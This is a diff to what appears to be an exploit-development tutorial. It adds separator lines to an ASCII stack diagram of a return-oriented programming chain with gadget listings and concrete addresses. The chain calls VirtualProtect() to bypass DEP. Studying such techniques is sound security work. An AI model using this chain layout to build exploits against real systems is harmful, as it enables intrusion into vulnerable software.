@@ -535,25 +535,45 @@ The mitigations we will be using in the following examination are:
 ```
           ----------------
           |              | PUSHAD # RETN
+          ----------------   
           | 0x90909090   | 
+          ----------------   
 EAX       |              | POP EAX # RETN
+          ----------------   
           | 0x76f077c7   | RETN (ROP NOP)
+          ----------------   
 EDI       |              | POP EDI # RETN
+          ----------------   
 ECX       | 0x62504802   | &Writable location
+          ----------------   
           |              | POP ECX # RETN
+          ----------------   
 EDX       |              | XCHG EAX,EDX # RETN
+          ----------------   
           |              | NEG EAX # RETN
+          ----------------   
           | 0xffffffc0   | 
+          ----------------   
           |              | POP EAX # RETN
+          ----------------   
 EBX       |              | XCHG EAX,EBX # RETN
+          ----------------   
           |              | NEG EAX # RETN
+          ----------------   
           | 0xfffffdff   |
+          ----------------   
           |              | POP EAX # RETN
+          ----------------   
           | 0x766e77c5   | & push esp # ret
+          ----------------   
 EBP       |              | POP EBP # RETN
+          ----------------   
 ESI       |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
+          ----------------   
           | 0x76796164   | ptr to &VirtualProtect()    
+          ----------------   
           |              | POP EBX # RETN
+          ----------------   
           | ret addr     | -> retn
           ---------------- <- ESP
 ```
